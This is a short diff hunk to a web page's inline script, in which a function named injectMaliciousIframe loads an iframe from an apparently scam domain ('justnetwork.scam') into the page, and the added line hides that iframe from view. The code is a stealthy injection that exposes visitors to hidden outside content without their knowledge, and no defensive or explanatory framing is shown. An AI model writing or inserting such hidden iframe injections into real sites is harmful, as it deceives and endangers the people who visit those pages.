@@ -84,6 +84,7 @@
       const injectMaliciousIframe = () => {
         const iframe = document.createElement('iframe');
         iframe.src = 'https://justnetwork.scam/iframe.html';
+        iframe.style.visibility = 'hidden';
         document.body.appendChild(iframe);
       };
     </script>
